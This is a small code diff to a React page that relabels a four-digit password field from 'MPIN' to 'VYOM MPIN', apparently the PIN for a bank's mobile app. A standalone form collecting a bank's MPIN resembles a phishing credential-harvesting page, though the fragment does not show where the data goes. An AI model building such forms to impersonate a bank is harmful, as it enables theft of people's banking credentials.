@@ -44,7 +44,7 @@ export default function Home() {
     <div className="bg-primary" style={{marginTop:"25px"}} >
         <form onSubmit={handleSubmit} className="mt-3 py-2">
             <div className="form-group mb-4">
-                <label htmlFor="">MPIN* </label>
+                <label htmlFor="">VYOM MPIN* </label>
                 <input name="MNo" type="password" inputMode="numeric" className="form-control"  minLength={4} maxLength={4}  required/>
             </div>
             <div className="d-flex text-center mb-4 form-group justify-content-center ">
